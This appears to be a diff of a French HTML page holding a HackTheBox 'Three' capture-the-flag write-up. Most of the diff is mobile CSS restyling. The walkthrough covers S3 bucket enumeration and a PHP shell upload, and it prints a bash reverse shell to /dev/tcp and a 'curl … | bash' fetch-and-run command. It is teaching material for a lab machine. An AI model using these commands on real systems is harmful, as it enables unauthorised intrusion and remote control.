@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
 <title>Three — HackTheBox | Write-up Complet par SPECTRA MZ</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -24,6 +24,7 @@
     --text:      #e2e8f4;
     --muted:     #6b7a99;
     --code-bg:   #060a14;
+    --radius:    10px;
   }
   html { scroll-behavior: smooth; }
   body {
@@ -33,6 +34,7 @@
     font-size: 16px;
     line-height: 1.8;
     overflow-x: hidden;
+    -webkit-text-size-adjust: 100%;
   }
   body::before {
     content: '';
@@ -46,22 +48,25 @@
   ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
   ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
 
-  /* ─── Sidebar ─── */
+  /* ─── Sidebar (mobile friendly) ─── */
   .sidebar {
     position: fixed; left: 0; top: 0;
-    width: 64px; height: 100vh;
+    width: 56px; height: 100vh;
     display: flex; flex-direction: column;
     align-items: center; justify-content: center;
-    z-index: 100; padding: 2rem 0;
+    z-index: 100; padding: 1rem 0;
+    background: rgba(8,12,24,.7);
+    backdrop-filter: blur(6px);
+    border-right: 1px solid var(--border);
   }
   .sidebar-line { width: 1px; flex: 1; background: var(--border); }
   .phase-dot {
-    width: 32px; height: 32px; border-radius: 50%;
+    width: 28px; height: 28px; border-radius: 50%;
     border: 1px solid var(--border);
     background: var(--surface);
     display: flex; align-items: center; justify-content: center;
     font-family: 'JetBrains Mono', monospace;
-    font-size: 9px; color: var(--muted);
+    font-size: 8px; color: var(--muted);
     cursor: pointer; transition: all .3s;
     text-decoration: none; flex-shrink: 0;
   }
@@ -70,35 +75,52 @@
     box-shadow: 0 0 12px var(--cyan-glow);
     background: var(--cyan-dim);
   }
-  @media (max-width: 640px) { .sidebar { display: none; } }
+  @media (max-width: 640px) {
+    .sidebar { width: 40px; padding: 0.6rem 0; }
+    .phase-dot { width: 22px; height: 22px; font-size: 7px; }
+    .sidebar-line { flex: 0.5; }
+  }
+  @media (max-width: 480px) {
+    .sidebar { display: none; }
+  }
 
   /* ─── Main ─── */
-  main { margin-left: 64px; width: calc(100% - 64px); padding: 0 2rem 6rem; }
+  main {
+    margin-left: 56px;
+    padding: 0 1.5rem 4rem;
+    width: calc(100% - 56px);
+  }
   .inner { max-width: 1000px; margin: 0 auto; }
+  @media (max-width: 640px) {
+    main { margin-left: 40px; padding: 0 1rem 3rem; width: calc(100% - 40px); }
+  }
+  @media (max-width: 480px) {
+    main { margin-left: 0; padding: 0 0.8rem 2.5rem; width: 100%; }
+  }
 
   /* ─── Hero ─── */
-  .hero { padding: 5.5rem 0 4rem; position: relative; }
+  .hero { padding: 4rem 0 3rem; position: relative; }
   .hero-eyebrow {
     font-family: 'JetBrains Mono', monospace;
-    font-size: 11px; letter-spacing: .18em; text-transform: uppercase;
-    color: var(--cyan); margin-bottom: 1.5rem;
-    display: flex; align-items: center; gap: .75rem;
+    font-size: 10px; letter-spacing: .15em; text-transform: uppercase;
+    color: var(--cyan); margin-bottom: 1.2rem;
+    display: flex; align-items: center; gap: .6rem;
   }
-  .hero-eyebrow::before { content:''; display:inline-block; width:24px; height:1px; background: var(--cyan); }
+  .hero-eyebrow::before { content:''; display:inline-block; width:20px; height:1px; background: var(--cyan); }
   .hero-title {
     font-family: 'JetBrains Mono', monospace;
-    font-size: clamp(2.2rem, 5vw, 3.6rem);
-    font-weight: 700; line-height: 1.1; letter-spacing: -.02em;
-    margin-bottom: 1rem;
+    font-size: clamp(1.8rem, 5vw, 3.2rem);
+    font-weight: 700; line-height: 1.15; letter-spacing: -.02em;
+    margin-bottom: 0.8rem;
   }
   .hero-title .accent { color: var(--cyan); }
   .hero-title .dim    { color: var(--muted); font-weight: 300; }
-  .hero-sub { font-size: 1.05rem; color: var(--muted); margin-bottom: 2.5rem; max-width: 620px; }
-  .meta-pills { display: flex; flex-wrap: wrap; gap: .6rem; margin-bottom: 2rem; }
+  .hero-sub { font-size: 0.95rem; color: var(--muted); margin-bottom: 2rem; max-width: 620px; }
+  .meta-pills { display: flex; flex-wrap: wrap; gap: .5rem; margin-bottom: 1.5rem; }
   .pill {
-    padding: .3rem .9rem; border-radius: 99px;
+    padding: .25rem .7rem; border-radius: 99px;
     font-family: 'JetBrains Mono', monospace;
-    font-size: 11px; letter-spacing: .08em; font-weight: 500;
+    font-size: 10px; letter-spacing: .06em; font-weight: 500;
   }
   .pill-cyan   { border:1px solid var(--cyan);   color:var(--cyan);   background:var(--cyan-dim); }
   .pill-red    { border:1px solid var(--red);    color:var(--red);    background:#ff475711; }
@@ -108,124 +130,144 @@
   .hero-divider {
     width: 100%; height: 1px;
     background: linear-gradient(90deg, var(--cyan) 0%, var(--border) 60%, transparent 100%);
-    margin-top: 3rem;
+    margin-top: 2.5rem;
+  }
+  @media (max-width: 480px) {
+    .hero { padding: 2.5rem 0 2rem; }
+    .hero-sub { font-size: 0.9rem; }
   }
 
   /* ─── TOC ─── */
   .toc {
     background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; padding: 1.5rem 1.8rem; margin: 2rem 0;
+    border-radius: var(--radius); padding: 1.2rem 1.5rem; margin: 1.8rem 0;
   }
   .toc-title {
-    font-family: 'JetBrains Mono', monospace; font-size: .75rem;
+    font-family: 'JetBrains Mono', monospace; font-size: .7rem;
     letter-spacing: .15em; text-transform: uppercase; color: var(--cyan);
-    margin-bottom: 1rem;
+    margin-bottom: 0.8rem;
   }
-  .toc-list { list-style: none; display: grid; grid-template-columns: 1fr 1fr; gap: .5rem 1.5rem; }
-  @media (max-width: 640px) { .toc-list { grid-template-columns: 1fr; } }
+  .toc-list { list-style: none; display: grid; grid-template-columns: 1fr 1fr; gap: .4rem 1.2rem; }
   .toc-list a {
-    font-size: .85rem; color: #b8c3d9; text-decoration: none;
-    display: flex; align-items: baseline; gap: .5rem;
+    font-size: .8rem; color: #b8c3d9; text-decoration: none;
+    display: flex; align-items: baseline; gap: .4rem;
     transition: color .2s;
   }
   .toc-list a:hover { color: var(--cyan); }
-  .toc-num { font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted); flex-shrink: 0; }
+  .toc-num { font-family: 'JetBrains Mono', monospace; font-size: .65rem; color: var(--muted); flex-shrink: 0; }
+  @media (max-width: 640px) {
+    .toc { padding: 1rem; }
+    .toc-list { grid-template-columns: 1fr; gap: .3rem; }
+    .toc-list a { font-size: .75rem; }
+  }
 
   /* ─── Sections ─── */
-  .section { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
+  .section { padding: 2.5rem 0 1.8rem; border-bottom: 1px solid var(--border); }
   .section:last-of-type { border-bottom: none; }
   .section-label {
     font-family: 'JetBrains Mono', monospace;
-    font-size: 10px; letter-spacing: .2em; text-transform: uppercase;
-    color: var(--cyan); margin-bottom: .6rem;
-    display: flex; align-items: center; gap: .5rem;
+    font-size: 9px; letter-spacing: .2em; text-transform: uppercase;
+    color: var(--cyan); margin-bottom: .4rem;
+    display: flex; align-items: center; gap: .4rem;
   }
   .section-label span { color: var(--muted); }
   .section-title {
     font-family: 'JetBrains Mono', monospace;
-    font-size: 1.45rem; font-weight: 600; color: var(--text);
-    margin-bottom: 1.5rem; line-height: 1.3;
+    font-size: 1.25rem; font-weight: 600; color: var(--text);
+    margin-bottom: 1.2rem; line-height: 1.3;
   }
   .subsection-title {
     font-family: 'JetBrains Mono', monospace;
-    font-size: 1rem; font-weight: 600; color: var(--cyan);
-    margin: 2.2rem 0 .9rem; padding-left: 1rem; border-left: 2px solid var(--cyan);
+    font-size: .9rem; font-weight: 600; color: var(--cyan);
+    margin: 1.8rem 0 .7rem; padding-left: 0.8rem; border-left: 2px solid var(--cyan);
+  }
+  @media (max-width: 480px) {
+    .section { padding: 1.8rem 0 1.2rem; }
+    .section-title { font-size: 1.1rem; }
+    .subsection-title { font-size: .85rem; padding-left: 0.6rem; }
   }
 
   /* ─── Definitions ─── */
   .def-box {
     background: linear-gradient(135deg, #2f9bff0a 0%, #2f9bff03 100%);
     border: 1px solid var(--blue);
-    border-radius: 10px;
-    padding: 1.3rem 1.5rem;
-    margin: 1.2rem 0 1.6rem;
+    border-radius: var(--radius);
+    padding: 1rem 1.2rem;
+    margin: 1rem 0 1.4rem;
   }
   .def-term {
-    display: flex; align-items: center; gap: .6rem;
+    display: flex; align-items: center; gap: .5rem;
     font-family: 'JetBrains Mono', monospace;
-    font-size: .95rem; font-weight: 700; color: var(--blue);
-    margin-bottom: .5rem;
+    font-size: .85rem; font-weight: 700; color: var(--blue);
+    margin-bottom: .4rem;
   }
-  .def-term::before { content: '§'; font-size: 1.1rem; }
-  .def-body { color: #b8c3d9; font-size: .9rem; }
+  .def-term::before { content: '§'; font-size: 1rem; }
+  .def-body { color: #b8c3d9; font-size: .85rem; }
   .def-body code { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: .1em .4em; color: #c0cce8; font-size: .85em; }
 
-  .glossary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .glossary-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 0.8rem; margin: 1.2rem 0;
+  }
   .glossary-card {
     background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; padding: 1.2rem;
+    border-radius: var(--radius); padding: 1rem;
   }
   .glossary-term {
-    font-family: 'JetBrains Mono', monospace; font-size: .85rem; font-weight: 700;
-    color: var(--cyan); margin-bottom: .5rem;
+    font-family: 'JetBrains Mono', monospace; font-size: .8rem; font-weight: 700;
+    color: var(--cyan); margin-bottom: .4rem;
   }
-  .glossary-def { font-size: .82rem; color: var(--muted); line-height: 1.55; }
+  .glossary-def { font-size: .78rem; color: var(--muted); line-height: 1.5; }
 
   /* ─── Code & Terminal ─── */
   .terminal-frame {
     background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; overflow: hidden; margin: 1.5rem 0;
+    border-radius: var(--radius); overflow: hidden; margin: 1.2rem 0;
     box-shadow: 0 8px 40px rgba(0,0,0,.5), 0 0 0 1px rgba(0,212,170,.06);
   }
   .terminal-bar {
-    background: var(--surface2); padding: .6rem 1rem;
-    display: flex; align-items: center; gap: .5rem;
+    background: var(--surface2); padding: .5rem .8rem;
+    display: flex; align-items: center; gap: .4rem;
     border-bottom: 1px solid var(--border);
   }
-  .t-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .t-dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
   .t-dot-red   { background: #ff5f57; }
   .t-dot-amber { background: #ffbd2e; }
   .t-dot-green { background: #28c840; }
-  .terminal-bar-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); margin-left: .5rem; }
+  .terminal-bar-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); margin-left: .4rem; }
   .terminal-caption {
-    padding: .6rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: 11px;
+    padding: .5rem .8rem; font-family: 'JetBrains Mono', monospace; font-size: 10px;
     color: var(--muted); background: var(--surface2); border-top: 1px solid var(--border);
-    display: flex; align-items: center; gap: .5rem;
+    display: flex; align-items: center; gap: .4rem;
   }
   .terminal-caption::before { content: '▸'; color: var(--cyan); }
+  .terminal-frame pre {
+    padding: 0.8rem 1rem; margin: 0; overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace; font-size: .75rem; line-height: 1.6; color: #c0cce8;
+  }
 
   .code-wrap {
     background: var(--code-bg); border: 1px solid var(--border);
-    border-radius: 8px; overflow: hidden; margin: 1rem 0 1.5rem; position: relative;
+    border-radius: var(--radius); overflow: hidden; margin: 1rem 0 1.2rem; position: relative;
   }
   .code-header {
-    background: var(--surface2); padding: .45rem 1rem;
+    background: var(--surface2); padding: .35rem .8rem;
     display: flex; align-items: center; justify-content: space-between;
     border-bottom: 1px solid var(--border);
   }
   .code-lang {
-    font-family: 'JetBrains Mono', monospace; font-size: 10px;
+    font-family: 'JetBrains Mono', monospace; font-size: 9px;
     letter-spacing: .12em; text-transform: uppercase; color: var(--cyan);
   }
   .copy-btn {
     background: none; border: 1px solid var(--border); color: var(--muted);
-    font-family: 'JetBrains Mono', monospace; font-size: 10px;
-    padding: .2rem .6rem; border-radius: 4px; cursor: pointer; transition: all .2s;
+    font-family: 'JetBrains Mono', monospace; font-size: 9px;
+    padding: .15rem .5rem; border-radius: 4px; cursor: pointer; transition: all .2s;
   }
   .copy-btn:hover { border-color: var(--cyan); color: var(--cyan); }
   .code-wrap pre {
-    padding: 1.1rem 1.2rem; overflow-x: auto;
-    font-family: 'JetBrains Mono', monospace; font-size: .8rem; line-height: 1.7; color: #c0cce8;
+    padding: 0.8rem 1rem; margin: 0; overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace; font-size: .75rem; line-height: 1.6; color: #c0cce8;
   }
   .code-wrap pre .kw  { color: var(--cyan); }
   .code-wrap pre .str { color: #ffdd87; }
@@ -233,33 +275,33 @@
   .code-wrap pre .cmt { color: var(--muted); font-style: italic; }
 
   .result-badge {
-    display: inline-flex; align-items: center; gap: .5rem;
+    display: inline-flex; align-items: center; gap: .4rem;
     background: #00d4aa0f; border: 1px solid var(--cyan); border-radius: 6px;
-    padding: .5rem 1rem; font-family: 'JetBrains Mono', monospace;
-    font-size: .82rem; color: var(--cyan); margin: .5rem 0 1rem;
+    padding: .4rem .8rem; font-family: 'JetBrains Mono', monospace;
+    font-size: .78rem; color: var(--cyan); margin: .5rem 0 1rem;
   }
   .result-badge::before { content: '✓'; font-weight: 700; }
 
   .warn-badge {
-    display: inline-flex; align-items: center; gap: .5rem;
+    display: inline-flex; align-items: center; gap: .4rem;
     background: #ffa5020f; border: 1px solid var(--amber); border-radius: 6px;
-    padding: .5rem 1rem; font-family: 'JetBrains Mono', monospace;
-    font-size: .82rem; color: var(--amber); margin: .5rem 0 1rem;
+    padding: .4rem .8rem; font-family: 'JetBrains Mono', monospace;
+    font-size: .78rem; color: var(--amber); margin: .5rem 0 1rem;
   }
   .warn-badge::before { content: '⚠'; font-weight: 700; }
 
   .info-badge {
-    display: inline-flex; align-items: center; gap: .5rem;
+    display: inline-flex; align-items: center; gap: .4rem;
     background: #2f9bff0f; border: 1px solid #2f9bff; border-radius: 6px;
-    padding: .5rem 1rem; font-family: 'JetBrains Mono', monospace;
-    font-size: .82rem; color: #6cb6ff; margin: .5rem 0 1rem;
+    padding: .4rem .8rem; font-family: 'JetBrains Mono', monospace;
+    font-size: .78rem; color: #6cb6ff; margin: .5rem 0 1rem;
   }
   .info-badge::before { content: 'ℹ'; font-weight: 700; }
 
   .flag-box {
     background: linear-gradient(135deg, #00d4aa0a 0%, #00d4aa03 100%);
-    border: 1px solid var(--cyan); border-radius: 10px;
-    padding: 1.8rem 2rem; text-align: center; position: relative; overflow: hidden; margin: 1.5rem 0;
+    border: 1px solid var(--cyan); border-radius: var(--radius);
+    padding: 1.5rem; text-align: center; position: relative; overflow: hidden; margin: 1.5rem 0;
   }
   .flag-box::before {
     content: ''; position: absolute; inset: 0;
@@ -267,11 +309,11 @@
     pointer-events: none;
   }
   .flag-label {
-    font-family: 'JetBrains Mono', monospace; font-size: 10px;
-    letter-spacing: .2em; text-transform: uppercase; color: var(--muted); margin-bottom: .8rem;
+    font-family: 'JetBrains Mono', monospace; font-size: 9px;
+    letter-spacing: .2em; text-transform: uppercase; color: var(--muted); margin-bottom: .6rem;
   }
   .flag-text {
-    font-family: 'JetBrains Mono', monospace; font-size: 1.2rem; font-weight: 700;
+    font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; font-weight: 700;
     color: var(--cyan); letter-spacing: .03em; text-shadow: 0 0 20px var(--cyan-glow);
     word-break: break-all;
   }
@@ -279,24 +321,30 @@
   /* ─── Diagram (SVG) ─── */
   .diagram-container {
     background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0;
+    border-radius: var(--radius); padding: 1rem; margin: 1.2rem 0;
     overflow-x: auto;
   }
   .diagram-container svg {
-    display: block; width: 100%; height: auto; max-width: 900px; margin: 0 auto;
+    display: block; width: 100%; height: auto; max-width: 800px; margin: 0 auto;
+  }
+  @media (max-width: 640px) {
+    .diagram-container svg { max-width: 600px; }
+  }
+  @media (max-width: 480px) {
+    .diagram-container svg { max-width: 100%; }
   }
 
   /* ─── Back & Share Buttons ─── */
   .top-actions {
-    display: flex; flex-wrap: wrap; gap: 1rem;
-    margin-bottom: 2rem; align-items: center;
+    display: flex; flex-wrap: wrap; gap: 0.8rem;
+    margin-bottom: 1.5rem; align-items: center;
   }
   .btn-back, .btn-share {
-    display: inline-flex; align-items: center; gap: .5rem;
-    padding: .6rem 1.2rem;
+    display: inline-flex; align-items: center; gap: .4rem;
+    padding: .5rem 1rem;
     border-radius: 8px;
     font-family: 'JetBrains Mono', monospace;
-    font-size: .8rem;
+    font-size: .75rem;
     text-decoration: none;
     transition: all .2s;
     border: 1px solid var(--border);
@@ -310,17 +358,17 @@
     box-shadow: 0 0 16px var(--cyan-glow);
     transform: translateY(-1px);
   }
-  .btn-back svg, .btn-share svg { width: 18px; height: 18px; fill: currentColor; }
+  .btn-back svg, .btn-share svg { width: 16px; height: 16px; fill: currentColor; }
   .social-share {
-    display: flex; flex-wrap: wrap; gap: .6rem;
-    margin: 1.5rem 0;
+    display: flex; flex-wrap: wrap; gap: .5rem;
+    margin: 1rem 0;
   }
   .social-share a {
-    display: inline-flex; align-items: center; gap: .4rem;
-    padding: .4rem .9rem;
+    display: inline-flex; align-items: center; gap: .3rem;
+    padding: .35rem .7rem;
     border-radius: 6px;
     font-family: 'JetBrains Mono', monospace;
-    font-size: .75rem;
+    font-size: .7rem;
     text-decoration: none;
     border: 1px solid var(--border);
     background: var(--surface);
@@ -332,31 +380,54 @@
     color: var(--cyan);
     box-shadow: 0 0 12px var(--cyan-glow);
   }
-  .social-share a svg { width: 16px; height: 16px; fill: currentColor; }
+  .social-share a svg { width: 14px; height: 14px; fill: currentColor; }
 
   .footer-actions {
-    display: flex; flex-wrap: wrap; gap: 1.5rem;
-    margin-top: 2rem; padding-top: 2rem;
+    display: flex; flex-wrap: wrap; gap: 1rem;
+    margin-top: 1.5rem; padding-top: 1.5rem;
     border-top: 1px solid var(--border);
     align-items: center;
     justify-content: space-between;
   }
 
   @media (max-width: 640px) {
-    .sidebar { display: none; }
-    main { margin-left: 0; padding: 0 1.2rem 4rem; }
-    .hero-title { font-size: 1.7rem; }
     .top-actions { flex-direction: column; align-items: stretch; }
     .btn-back, .btn-share { justify-content: center; }
     .social-share { justify-content: center; }
     .footer-actions { flex-direction: column; align-items: stretch; text-align: center; }
+  }
+
+  /* ─── Footer ─── */
+  footer {
+    margin-top: 3rem; padding: 1.5rem 0; border-top: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem;
+  }
+  .footer-author { font-family: 'JetBrains Mono', monospace; font-size: .75rem; color: var(--muted); }
+  .footer-badge {
+    font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted);
+    display: flex; align-items: center; gap: .3rem;
+  }
+  .footer-badge span { color: var(--cyan); }
+  .bottom-back {
+    display: inline-flex; align-items: center; gap: .4rem;
+    padding: .6rem 1rem; margin-top: 0.8rem;
+    border: 1px solid var(--cyan); border-radius: 8px;
+    color: var(--cyan); text-decoration: none;
+    font-family: 'JetBrains Mono', monospace; font-size: .75rem;
+    background: var(--cyan-dim);
+    transition: all .2s;
+  }
+  .bottom-back:hover { box-shadow: 0 0 20px var(--cyan-glow); transform: translateY(-1px); }
+  @media (max-width: 480px) {
+    footer { flex-direction: column; text-align: center; }
+    .footer-author { font-size: .7rem; }
   }
 </style>
 </head>
 <body>
 
 <!-- Sidebar -->
-<nav class="sidebar">
+<nav class="sidebar" aria-label="Navigation rapide">
   <div class="sidebar-line"></div>
   <a class="phase-dot" href="#s0">00</a>
   <div class="sidebar-line"></div>
@@ -400,13 +471,10 @@
   <!-- HERO -->
   <header class="hero">
     <div class="hero-eyebrow">HackTheBox · Machine Linux · Write‑up Avancé</div>
-    <h1 class="hero-title">
-      <span class="dim">Three</span>
-    </h1>
+    <h1 class="hero-title"><span class="dim">Three</span></h1>
     <p class="hero-sub">
-      Exploitation d’un bucket S3 mal configuré pour obtenir un reverse shell et compromettre
-      la machine <strong>Three</strong>. Chaque terme — bucket, endpoint, awscli, reverse shell,
-      architecture C2 — est décortiqué avec une approche pédagogique et professionnelle.
+      Exploitation d’un bucket S3 mal configuré pour obtenir un reverse shell et compromettre la machine <strong>Three</strong>.
+      Chaque terme — bucket, endpoint, awscli, reverse shell, architecture C2 — est décortiqué avec une approche pédagogique et professionnelle.
     </p>
     <div class="meta-pills">
       <span class="pill pill-cyan">S3 Bucket</span>
@@ -424,10 +492,10 @@
     <ul class="toc-list">
       <li><span class="toc-num">00</span><a href="#s0">Présentation du challenge</a></li>
       <li><span class="toc-num">01</span><a href="#s1">Fondamentaux théoriques</a></li>
-      <li><span class="toc-num">02</span><a href="#s2">Reconnaissance — Nmap & Gobuster</a></li>
+      <li><span class="toc-num">02</span><a href="#s2">Reconnaissance — Nmap &amp; Gobuster</a></li>
       <li><span class="toc-num">03</span><a href="#s3">Découverte du bucket S3</a></li>
       <li><span class="toc-num">04</span><a href="#s4">Exploitation — Upload d’un shell PHP</a></li>
-      <li><span class="toc-num">05</span><a href="#s5">Reverse Shell & C2</a></li>
+      <li><span class="toc-num">05</span><a href="#s5">Reverse Shell &amp; C2</a></li>
       <li><span class="toc-num">06</span><a href="#s6">Récupération du flag</a></li>
       <li><span class="toc-num">07</span><a href="#s7">Analyse de l’architecture C2</a></li>
       <li><span class="toc-num">08</span><a href="#s8">Recommandations de sécurité</a></li>
@@ -458,7 +526,7 @@
     <div class="section-label">Phase <span>01</span></div>
     <h2 class="section-title">Fondamentaux Théoriques</h2>
 
-    <h3 class="subsection-title">Amazon S3 & Buckets</h3>
+    <h3 class="subsection-title">Amazon S3 &amp; Buckets</h3>
     <div class="def-box">
       <div class="def-term">Bucket S3</div>
       <div class="def-body">
@@ -466,7 +534,7 @@
       </div>
     </div>
 
-    <h3 class="subsection-title">AWS CLI & Endpoint</h3>
+    <h3 class="subsection-title">AWS CLI &amp; Endpoint</h3>
     <div class="def-box">
       <div class="def-term">AWS CLI</div>
       <div class="def-body">
@@ -480,7 +548,7 @@
       </div>
     </div>
 
-    <h3 class="subsection-title">Reverse Shell & C2</h3>
+    <h3 class="subsection-title">Reverse Shell &amp; C2</h3>
     <div class="def-box">
       <div class="def-term">Reverse Shell</div>
       <div class="def-body">
@@ -488,7 +556,7 @@
       </div>
     </div>
     <div class="def-box">
-      <div class="def-term">Architecture C2 (Command & Control)</div>
+      <div class="def-term">Architecture C2 (Command &amp; Control)</div>
       <div class="def-body">
         Un système où un attaquant maintient une communication avec une machine compromise. Le reverse shell obtenu agit comme un <strong>implant</strong> qui se connecte à un serveur de commande (l’attaquant). Cette architecture permet de transmettre des ordres et d’exfiltrer des données. Dans ce challenge, le serveur HTTP Python et le listener Netcat forment un C2 minimaliste.
       </div>
@@ -498,10 +566,8 @@
   <!-- SECTION 02 -->
   <section class="section" id="s2">
     <div class="section-label">Phase <span>02</span></div>
-    <h2 class="section-title">Reconnaissance — Nmap & Gobuster</h2>
-    <p>
-      Un scan Nmap révèle deux ports ouverts :
-    </p>
+    <h2 class="section-title">Reconnaissance — Nmap &amp; Gobuster</h2>
+    <p>Un scan Nmap révèle deux ports ouverts :</p>
     <div class="terminal-frame">
       <div class="terminal-bar">
         <div class="t-dot t-dot-red"></div>
@@ -509,15 +575,15 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">nmap -sV 10.129.227.248</span>
       </div>
-      <pre style="padding:1rem;margin:0;font-size:.8rem;line-height:1.6;">
+      <pre>
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-      </pre>
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</pre>
     </div>
     <p>
       Le site web (port 80) présente une page statique avec un formulaire de contact qui pointe vers <code>/action_page.php</code>, indiquant la présence de PHP. L’adresse email mentionne le domaine <code>thetoppers.htb</code>.
     </p>
+
     <h3 class="subsection-title">Le fichier /etc/hosts</h3>
     <div class="def-box">
       <div class="def-term">/etc/hosts</div>
@@ -530,9 +596,7 @@ PORT   STATE SERVICE VERSION
       <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
       <pre>echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts</pre>
     </div>
-    <p>
-      Désormais, le navigateur résout <code>thetoppers.htb</code> vers la machine cible.
-    </p>
+    <p>Désormais, le navigateur résout <code>thetoppers.htb</code> vers la machine cible.</p>
 
     <h3 class="subsection-title">Énumération des sous‑domaines avec Gobuster</h3>
     <p>
@@ -547,11 +611,9 @@ PORT   STATE SERVICE VERSION
     </p>
     <div class="terminal-frame">
       <div class="terminal-bar"><div class="t-dot t-dot-red"></div><div class="t-dot t-dot-amber"></div><div class="t-dot t-dot-green"></div><span class="terminal-bar-label">Gobuster output</span></div>
-      <pre style="padding:.8rem;margin:0;">Found: s3.thetoppers.htb</pre>
+      <pre>Found: s3.thetoppers.htb</pre>
     </div>
-    <p>
-      Ce sous‑domaine <code>s3.thetoppers.htb</code> laisse présager un service S3.
-    </p>
+    <p>Ce sous‑domaine <code>s3.thetoppers.htb</code> laisse présager un service S3.</p>
   </section>
 
   <!-- SECTION 03 -->
@@ -564,21 +626,19 @@ PORT   STATE SERVICE VERSION
     <div class="code-wrap">
       <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
       <pre>aws configure
-<span class="cmt"># Access Key ID: test</span>
-<span class="cmt"># Secret Access Key: test</span>
-<span class="cmt"># Region: us-east-1</span>
-<span class="cmt"># Output format: json</span></pre>
+# Access Key ID: test
+# Secret Access Key: test
+# Region: us-east-1
+# Output format: json</pre>
     </div>
-    <p>
-      On liste les buckets disponibles via l’endpoint personnalisé :
-    </p>
+    <p>On liste les buckets disponibles via l’endpoint personnalisé :</p>
     <div class="code-wrap">
       <div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
       <pre>aws --endpoint-url=http://s3.thetoppers.htb s3 ls</pre>
     </div>
     <div class="terminal-frame">
       <div class="terminal-bar"><div class="t-dot t-dot-red"></div><div class="t-dot t-dot-amber"></div><div class="t-dot t-dot-green"></div><span class="terminal-bar-label">Output</span></div>
-      <pre style="padding:.8rem;margin:0;">2021-12-14 15:17:07 thetoppers.htb</pre>
+      <pre>2021-12-14 15:17:07 thetoppers.htb</pre>
     </div>
     <p>Un seul bucket nommé <code>thetoppers.htb</code>. On liste son contenu :</p>
     <div class="code-wrap">
@@ -587,11 +647,9 @@ PORT   STATE SERVICE VERSION
     </div>
     <div class="terminal-frame">
       <div class="terminal-bar"><div class="t-dot t-dot-red"></div><div class="t-dot t-dot-amber"></div><div class="t-dot t-dot-green"></div><span class="terminal-bar-label">Output</span></div>
-      <pre style="padding:.8rem;margin:0;">
-                           PRE images/
+      <pre>                           PRE images/
 2021-12-14 15:17:08         52 .htaccess
-2021-12-14 15:17:08       3405 index.php
-      </pre>
+2021-12-14 15:17:08       3405 index.php</pre>
     </div>
     <p>
       On découvre la racine du site web (index.php, .htaccess) stockée dans le bucket.
@@ -626,7 +684,7 @@ PORT   STATE SERVICE VERSION
   <!-- SECTION 05 -->
   <section class="section" id="s5">
     <div class="section-label">Phase <span>05</span></div>
-    <h2 class="section-title">Reverse Shell & C2</h2>
+    <h2 class="section-title">Reverse Shell &amp; C2</h2>
     <p>
       Pour obtenir un shell interactif, on prépare un script bash de reverse shell
       (<code>shell.sh</code>) pointant vers notre machine (IP tun0) sur le port 1337.
@@ -659,16 +717,12 @@ bash -i >& /dev/tcp/10.10.14.32/1337 0>&1</pre>
     <p>
       <strong>Détail :</strong> <code>%20</code> est l’encodage URL pour un espace, <code>%7C</code> pour le pipe <code>|</code>. La commande exécutée est : <code>curl 10.10.14.32:8000/shell.sh | bash</code>.
     </p>
-    <p>
-      La victime se connecte à notre Netcat, nous donnant un shell <code>www-data</code>.
-    </p>
+    <p>La victime se connecte à notre Netcat, nous donnant un shell <code>www-data</code>.</p>
     <div class="terminal-frame">
       <div class="terminal-bar"><div class="t-dot t-dot-red"></div><div class="t-dot t-dot-amber"></div><div class="t-dot t-dot-green"></div><span class="terminal-bar-label">Shell obtenu</span></div>
-      <pre style="padding:.8rem;margin:0;">
-Ncat: Connection from 10.129.224.137:34888.
+      <pre>Ncat: Connection from 10.129.224.137:34888.
 www-data@three:/var/www/html$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-      </pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
     </div>
   </section>
 
@@ -676,15 +730,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
   <section class="section" id="s6">
     <div class="section-label">Phase <span>06</span></div>
     <h2 class="section-title">Récupération du flag</h2>
-    <p>
-      Une fois dans le shell, on navigue vers <code>/var/www</code> et on lit <code>flag.txt</code> :
-    </p>
